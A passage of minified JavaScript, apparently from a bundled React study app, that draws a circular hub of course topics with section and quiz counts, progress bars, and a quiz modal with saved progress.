Master"})]}),pn.map((m,f)=>{const y=f/pn.length*6.283-1.57,A=m.sections.filter(T=>t.done[m.id+":"+T.id]).length;return E.jsxs(We.button,{initial:{opacity:0,scale:.5,x:"-50%",y:"-50%"},animate:{opacity:1,scale:1,x:"-50%",y:"-50%"},transition:{delay:f*.08},className:"sn glass hub",style:{left:430+b*1.55*Math.cos(y),top:350+b*1.2*Math.sin(y),"--c":m.color},onClick:()=>v(m.id),children:[E.jsx("b",{children:m.name}),E.jsxs("small",{children:[m.sections.length," sections · ",m.quiz.length," QCM"]}),E.jsx("u",{style:{width:100*A/m.sections.length+"%"}})]},m.id)})]})},p?p.id:"main")})}),E.jsx(oC,{S:p,sec:a,p:t,toggle:g,open:v,onQuiz:()=>d(!0)},r+((a==null?void 0:a.id)||""))]}),E.jsx(Ki,{children:c&&p&&E.jsx(sC,{S:p,onClose:()=>d(!1),savedState:(h=t.quizProgress)==null?void 0:h[p.id],onUpdate:x})})]})}Pf(document.getElementById("root")).render(E.jsx(lC,{}));
